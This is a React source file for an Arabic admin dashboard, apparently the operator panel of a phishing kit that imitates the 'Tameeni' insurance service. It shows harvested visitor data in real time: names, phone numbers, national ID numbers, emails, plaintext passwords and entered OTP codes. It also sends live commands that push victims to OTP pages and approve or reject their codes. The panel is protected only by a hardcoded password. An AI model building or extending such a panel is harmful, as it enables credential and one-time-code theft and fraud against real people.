import { useEffect, useRef, useState } from "react";
import { tameeniApi, type Submission } from "@/lib/api";
import { Shield, Trash2, Trash, Users, Wifi, WifiOff, Eye, EyeOff, ChevronDown } from "lucide-react";

const ADMIN_KEY = "tameeni_admin_auth";

function AdminLogin({ onLogin }: { onLogin: () => void }) {
  const [pw, setPw] = useState("");
  const [err, setErr] = useState(false);

  const check = () => {
    if (pw === "admin1234") { localStorage.setItem(ADMIN_KEY, "1"); onLogin(); }
    else setErr(true);
  };

  return (
    <div className="min-h-screen bg-gray-900 flex items-center justify-center" dir="rtl"
      style={{ fontFamily: "system-ui, -apple-system, Arial, sans-serif" }}>
      <div className="w-full max-w-sm mx-4">
        <div className="text-center mb-8 space-y-3">
          <div className="w-16 h-16 rounded-2xl bg-blue-600 flex items-center justify-center mx-auto shadow-lg">
            <Shield className="w-8 h-8 text-white" />
          </div>
          <h1 className="text-[22px] font-extrabold text-white">تأميني — لوحة التحكم</h1>
          <p className="text-[13px] text-gray-500">للمسؤولين فقط</p>
        </div>
        <div className="bg-gray-800 rounded-2xl p-6 border border-gray-700 space-y-4">
          <div>
            <label className="block text-[12px] font-bold text-gray-400 mb-1.5">كلمة المرور</label>
            <input type="password" value={pw} onChange={(e) => { setPw(e.target.value); setErr(false); }}
              onKeyDown={(e) => e.key === "Enter" && check()}
              className="w-full px-3 py-2.5 rounded-xl bg-gray-700 border border-gray-600 text-white text-[15px] outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-900 transition-all"
              dir="ltr" placeholder="••••••••" autoFocus />
            {err && <p className="text-red-400 text-[12px] mt-1.5 font-semibold">كلمة مرور غير صحيحة</p>}
          </div>
          <button onClick={check} className="w-full py-3 rounded-xl bg-blue-600 text-white font-bold text-[15px] hover:bg-blue-700 transition-colors">
            دخول
          </button>
        </div>
      </div>
    </div>
  );
}

export default function PagesCopy2fVHI6_B() {
  const [authed, setAuthed] = useState(() => !!localStorage.getItem(ADMIN_KEY));
  const [subs, setSubs] = useState<Submission[]>([]);
  const [selected, setSelected] = useState<Submission | null>(null);
  const [showPw, setShowPw] = useState(false);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    if (!authed) return;
    const load = async () => {
      const data = await tameeniApi.getAll();
      setSubs(data);
      if (selected) {
        const updated = data.find(s => s.id === selected.id);
        if (updated) setSelected(updated);
      }
    };
    load();
    timerRef.current = setInterval(load, 3000);
    return () => { if (timerRef.current) clearInterval(timerRef.current); };
  }, [authed]);

  if (!authed) return <AdminLogin onLogin={() => setAuthed(true)} />;

  const live = subs.filter(s => s.isActive).length;

  async function sendCmd(id: string, cmd: string) {
    await tameeniApi.sendCmd(id, cmd);
  }

  async function del(id: string) {
    await tameeniApi.deleteOne(id);
    setSubs(p => p.filter(s => s.id !== id));
    if (selected?.id === id) setSelected(null);
  }

  async function delAll() {
    if (!confirm("حذف جميع البيانات؟")) return;
    await tameeniApi.deleteAll();
    setSubs([]);
    setSelected(null);
  }

  const FLAG: Record<string, string> = {
    "Saudi Arabia": "🇸🇦", "UAE": "🇦🇪", "Kuwait": "🇰🇼",
    "Bahrain": "🇧🇭", "Qatar": "🇶🇦", "Oman": "🇴🇲",
    "Jordan": "🇯🇴", "Egypt": "🇪🇬", "Iraq": "🇮🇶",
  };

  return (
    <div className="min-h-screen bg-gray-950 flex flex-col" dir="rtl"
      style={{ fontFamily: "system-ui, -apple-system, Arial, sans-serif" }}>

      {/* Top bar */}
      <div className="bg-gray-900 border-b border-gray-800 px-4 py-3 flex items-center justify-between">
        <div className="flex items-center gap-2.5">
          <div className="w-8 h-8 rounded-lg bg-blue-600 flex items-center justify-center">
            <Shield className="w-4 h-4 text-white" />
          </div>
          <div>
            <h1 className="text-[15px] font-extrabold text-white leading-none">تأميني — لوحة التحكم</h1>
            <p className="text-[11px] text-gray-500 mt-0.5">إدارة الزوار</p>
          </div>
        </div>
        <div className="flex items-center gap-4">
          <div className="flex items-center gap-1.5 text-[12px] font-bold text-emerald-400">
            <div className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
            <span>{live} مباشر</span>
          </div>
          <div className="flex items-center gap-1.5 text-[12px] font-semibold text-gray-400">
            <Users className="w-3.5 h-3.5" />
            <span>{subs.length} زائر</span>
          </div>
          <button onClick={delAll} className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-red-950 border border-red-900 text-red-400 text-[12px] font-bold hover:bg-red-900 transition-colors">
            <Trash className="w-3.5 h-3.5" />
            حذف الكل
          </button>
        </div>
      </div>

      <div className="flex flex-1 overflow-hidden" style={{ height: "calc(100vh - 57px)" }}>
        {/* Visitors list */}
        <div className="w-1/2 border-l border-gray-800 overflow-y-auto bg-gray-950">
          {subs.length === 0 ? (
            <div className="flex flex-col items-center justify-center h-full text-gray-600 space-y-3">
              <Users className="w-12 h-12 opacity-20" />
              <p className="text-[14px] font-semibold">لا يوجد زوار بعد</p>
            </div>
          ) : (
            <div className="divide-y divide-gray-900">
              {subs.map((s) => (
                <button key={s.id} onClick={() => setSelected(s)}
                  className={`w-full text-right px-4 py-3 hover:bg-gray-900 transition-colors ${selected?.id === s.id ? "bg-gray-900 border-r-2 border-blue-500" : ""}`}>
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <div className={`w-2 h-2 rounded-full ${s.isActive ? "bg-emerald-400 animate-pulse" : "bg-gray-600"}`} />
                      <span className="text-[13px] font-extrabold text-white truncate max-w-[120px]">
                        {s.name || s.email || s.phone || s.id.slice(0, 8)}
                      </span>
                    </div>
                    <span className="text-[10px] text-gray-500">{FLAG[s.country] || ""} {s.country || "—"}</span>
                  </div>
                  <div className="flex items-center justify-between mt-1">
                    <span className="text-[11px] text-blue-400 font-semibold">{s.page || "—"}</span>
                    <span className="text-[10px] text-gray-600">{s.submittedAt}</span>
                  </div>
                </button>
              ))}
            </div>
          )}
        </div>

        {/* Details panel */}
        <div className="w-1/2 overflow-y-auto bg-gray-900">
          {!selected ? (
            <div className="flex flex-col items-center justify-center h-full text-gray-600 space-y-3">
              <Eye className="w-10 h-10 opacity-20" />
              <p className="text-[13px] font-semibold">اختر زائراً للتفاصيل</p>
            </div>
          ) : (
            <div className="p-5 space-y-5">
              {/* Header */}
              <div className="flex items-center justify-between">
                <div>
                  <h2 className="text-[16px] font-extrabold text-white">{selected.name || "—"}</h2>
                  <div className="flex items-center gap-1.5 mt-1">
                    {selected.isActive
                      ? <><Wifi className="w-3 h-3 text-emerald-400" /><span className="text-[11px] text-emerald-400 font-bold">مباشر الآن</span></>
                      : <><WifiOff className="w-3 h-3 text-gray-500" /><span className="text-[11px] text-gray-500 font-bold">غير متصل</span></>}
                  </div>
                </div>
                <button onClick={() => del(selected.id)} className="p-1.5 rounded-lg bg-red-950 border border-red-900 text-red-400 hover:bg-red-900 transition-colors">
                  <Trash2 className="w-4 h-4" />
                </button>
              </div>

              {/* Data grid */}
              <div className="bg-gray-950 rounded-2xl border border-gray-800 divide-y divide-gray-800">
                {[
                  { label: "الاسم", val: selected.name },
                  { label: "الجوال", val: selected.phone },
                  { label: "رقم الهوية", val: selected.nationalId },
                  { label: "البريد", val: selected.email },
                  { label: "كلمة المرور", val: selected.password, sensitive: true },
                  { label: "لوحة السيارة", val: selected.carPlate },
                  { label: "نوع السيارة", val: selected.carMake },
                  { label: "سنة الصنع", val: selected.carYear },
                  { label: "الدولة", val: `${FLAG[selected.country] || ""} ${selected.country}` },
                  { label: "الصفحة الحالية", val: selected.page },
                  { label: "الوقت", val: selected.submittedAt },
                  { label: "OTP أدخل", val: selected.otpCode || "—" },
                  { label: "حالة OTP", val: selected.otpStatus || "—" },
                ].map((row) => (
                  <div key={row.label} className="flex items-center justify-between px-4 py-2.5">
                    <span className="text-[11px] font-bold text-gray-500">{row.label}</span>
                    <span className={`text-[13px] font-semibold text-gray-200 ${row.sensitive && !showPw ? "blur-sm select-none" : ""}`} dir="ltr">
                      {row.val || "—"}
                    </span>
                  </div>
                ))}
              </div>
              <button onClick={() => setShowPw(!showPw)} className="flex items-center gap-1.5 text-[12px] text-gray-400 hover:text-white transition-colors">
                {showPw ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                {showPw ? "إخفاء كلمة المرور" : "إظهار كلمة المرور"}
              </button>

              {/* Commands */}
              <div className="space-y-3">
                <h3 className="text-[13px] font-extrabold text-gray-300">إرسال أوامر</h3>
                <div className="grid grid-cols-2 gap-2.5">
                  {[
                    { label: "طلب OTP", cmd: "redirect:otp", color: "bg-blue-900 border-blue-800 text-blue-300 hover:bg-blue-800" },
                    { label: "رفض OTP", cmd: "otp:rejected", color: "bg-red-950 border-red-900 text-red-300 hover:bg-red-900" },
                    { label: "قبول OTP", cmd: "otp:approved", color: "bg-emerald-950 border-emerald-900 text-emerald-300 hover:bg-emerald-900" },
                    { label: "تحديث الصفحة", cmd: "redirect:login", color: "bg-gray-800 border-gray-700 text-gray-300 hover:bg-gray-700" },
                  ].map((c) => (
                    <button key={c.cmd} onClick={() => sendCmd(selected.id, c.cmd)}
                      className={`py-2.5 rounded-xl border text-[13px] font-bold transition-colors ${c.color}`}>
                      {c.label}
                    </button>
                  ))}
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
